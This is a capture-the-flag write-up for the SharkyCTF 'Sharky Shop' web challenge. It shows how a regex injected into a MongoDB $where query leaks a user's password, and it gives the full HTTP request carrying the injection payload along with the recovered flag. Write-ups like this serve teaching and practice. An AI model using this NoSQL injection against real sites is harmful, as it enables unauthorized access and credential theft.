# Sharky Shop

## Description

This shark selling shop has been up for too long, it can't last anymore! Its disgusting users are comparing how much they spent on it. I can't take it anymore. Get an admin access on this website and share it with me so I can take it down.

sharky_shop.sharkyctf.xyz

Creator : Remsio

Hint:
```
Mongo databases are quite popular, you might be able to trigg an error somewhere :-)
```

We could get info about users with request:

```
POST /users HTTP/1.1
Host: sharky_shop.sharkyctf.xyz
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 716

draw=9&columns%5B0%5D%5Bdata%5D=username&columns%5B0%5D%5Bname%5D=&columns%5B0%5D%5Bsearchable%5D=true&columns%5B0%5D%5Borderable%5D=false&columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B1%5D%5Bdata%5D=moneyspent&columns%5B1%5D%5Bname%5D=&columns%5B1%5D%5Bsearchable%5D=true&columns%5B1%5D%5Borderable%5D=false&columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B2%5D%5Bdata%5D=roles&columns%5B2%5D%5Bname%5D=&columns%5B2%5D%5Bsearchable%5D=true&columns%5B2%5D%5Borderable%5D=false&columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B2%5D%5Bsearch%5D%5Bregex%5D=false&start=0&length=10&search%5Bvalue%5D=empty&search%5Bregex%5D=false
```

## Solution

As we understand from mongodb erros the query looks like:

```
db.users.find( { $where: function() {
   return (this.username.match(/.../))
} } );

```

So, we could check password with adding regular expression.

Like:
```
return (this.username.match(/.../) && this.password.match(/../))

```

Result query:

```
POST /users HTTP/1.1
Host: sharky_shop.sharkyctf.xyz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 159
Origin: http://sharky_shop.sharkyctf.xyz
Connection: close
Referer: http://sharky_shop.sharkyctf.xyz/customers
Cookie: sessionId=s%3AqwtjIJU7AVLaJhqgAhEynYuT_iXVOb2K.mgjqkw7qqGvluA7Xon65ukwMAK%2BW%2BVdmAf4DoPsoc0g

draw=1&start=0&length=10000&search[value]=<@urlencode_not_plus_3>jackyard/)&&this.password.match(/^Pzk1TvGxYwq10J6$<@/urlencode_not_plus_3>&search[regex]=false
```

Flag:

shkCTF{where_IS_MY_N0SQLI?_94dbabf632759f09956c283784408162}
